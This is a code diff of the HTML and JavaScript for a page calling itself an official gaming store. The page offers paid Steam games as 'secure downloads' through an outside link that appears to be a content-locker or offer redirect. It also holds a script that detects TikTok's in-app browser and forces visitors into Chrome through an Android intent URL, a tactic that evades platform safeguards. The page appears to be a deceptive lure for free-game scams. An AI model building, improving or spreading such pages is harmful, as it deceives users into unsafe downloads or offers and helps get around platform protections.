@@ -135,7 +135,6 @@ justify-content:center;
 z-index:9999;
 }
 
-/* BOX */
 .box{
 width:360px;
 background:#0f172a;
@@ -145,7 +144,6 @@ padding:20px;
 text-align:center;
 }
 
-/* PLATFORM BUTTONS */
 .platform-btn{
 width:100%;
 display:flex;
@@ -215,32 +213,6 @@ opacity:0.5;
 font-size:12px;
 padding:15px;
 }
-
-/* ===== TIKTOK BROWSER FIX (ADDED ONLY) ===== */
-#ttOverlay{
-position:fixed;
-inset:0;
-background:rgba(0,0,0,.95);
-z-index:999999;
-display:none;
-align-items:center;
-justify-content:center;
-flex-direction:column;
-text-align:center;
-color:#fff;
-padding:20px;
-}
-#ttOverlay h2{margin-bottom:10px}
-#ttOverlay p{opacity:.7;margin-bottom:20px}
-#ttOverlay button{
-padding:12px 18px;
-border:none;
-border-radius:10px;
-background:#3b82f6;
-color:#fff;
-font-weight:800;
-cursor:pointer;
-}
 </style>
 </head>
 
@@ -301,7 +273,6 @@ Official Gaming Store • Secure downloads & verified content<br>
 © 2026 OGAM STORE • All rights reserved
 </footer>
 
-<!-- YOUR SCRIPT (UNCHANGED) -->
 <script>
 
 const link="https://appchecker.space/cl/i/rnnqgv";
@@ -313,13 +284,7 @@ const games=[
 ["Forza Horizon 5","4.7","8.9M","https://cdn.cloudflare.steamstatic.com/steam/apps/1551360/header.jpg"],
 ["Rust","4.8","14M","https://cdn.cloudflare.steamstatic.com/steam/apps/252490/header.jpg"],
 ["Red Dead Redemption 2","4.9","18M","https://cdn.cloudflare.steamstatic.com/steam/apps/1174180/header.jpg"],
-["Hollow Knight","4.8","3.5M","https://cdn.cloudflare.steamstatic.com/steam/apps/367520/header.jpg"],
-["BeamNG Drive","4.5","5.3M","https://cdn.cloudflare.steamstatic.com/steam/apps/284160/header.jpg"],
-["Assetto Corsa","4.6","7.1M","https://cdn.cloudflare.steamstatic.com/steam/apps/244210/header.jpg"],
-["Euro Truck Simulator 2","4.7","10M","https://cdn.cloudflare.steamstatic.com/steam/apps/227300/header.jpg"],
-["Avatar","4.4","4.2M","https://cdn.cloudflare.steamstatic.com/steam/apps/2840770/header.jpg"],
-["Demon Slayer","4.6","6.2M","https://cdn.cloudflare.steamstatic.com/steam/apps/1490890/header.jpg"],
-["Poppy Playtime","4.5","9M","https://cdn.cloudflare.steamstatic.com/steam/apps/1721470/header.jpg"]
+["Hollow Knight","4.8","3.5M","https://cdn.cloudflare.steamstatic.com/steam/apps/367520/header.jpg"]
 ];
 
 const g=document.getElementById("games");
@@ -373,38 +338,69 @@ document.getElementById("frame").src=link;
 },25);
 }
 
-/* ===== TIKTOK DETECTION SCRIPT ===== */
-(function () {
+/* ===== TIKTOK FIXED OVERLAY ===== */
+function isTikTok(){
+  return /TikTok|musical_ly/i.test(navigator.userAgent);
+}
 
-  function isTikTok() {
-    return /TikTok|musical_ly/i.test(navigator.userAgent);
-  }
+function openChrome(){
+  const url = window.location.href;
 
-  function openChrome() {
-    const url = window.location.href;
-    const intent = "intent://" + url.replace(/^https?:\/\//,'') +
-      "#Intent;scheme=https;package=com.android.chrome;end;";
-    window.location.href = intent;
-    setTimeout(()=>{window.location.href=url},900);
-  }
+  const intent =
+    "intent://" +
+    url.replace(/^https?:\/\//,'') +
+    "#Intent;scheme=https;package=com.android.chrome;end;";
 
-  function showOverlay() {
-    const div = document.createElement("div");
-    div.id="ttOverlay";
-    div.innerHTML=`
-      <h2>Open in Browser</h2>
-      <p>For best experience open in Chrome / Safari</p>
-      <button onclick="(${openChrome.toString()})()">Open Now</button>
-    `;
-    document.body.appendChild(div);
-    div.style.display="flex";
-  }
+  window.location.href = intent;
 
+  setTimeout(()=>{ window.location.href = url; }, 900);
+}
+
+function showOverlay(){
+  const div=document.createElement("div");
+  div.id="ttOverlay";
+
+  div.innerHTML=`
+    <h2>Open in Browser</h2>
+    <p>For better experience open in Chrome or Safari</p>
+    <button id="openBtn">Open Now</button>
+  `;
+
+  document.body.appendChild(div);
+
+  div.style.cssText=`
+    position:fixed;inset:0;
+    background:rgba(0,0,0,.95);
+    display:flex;
+    flex-direction:column;
+    justify-content:center;
+    align-items:center;
+    text-align:center;
+    z-index:999999;
+    color:white;
+    padding:20px;
+  `;
+
+  const btn=div.querySelector("#openBtn");
+  btn.style.cssText=`
+    padding:14px 20px;
+    border:none;
+    border-radius:10px;
+    background:#3b82f6;
+    color:white;
+    font-weight:800;
+    cursor:pointer;
+  `;
+
+  btn.onclick=openChrome;
+}
+
+window.addEventListener("load",()=>{
   if(isTikTok()){
-    window.addEventListener("load",showOverlay);
+    showOverlay();
   }
+});
 
-})();
 </script>
 
 </body>
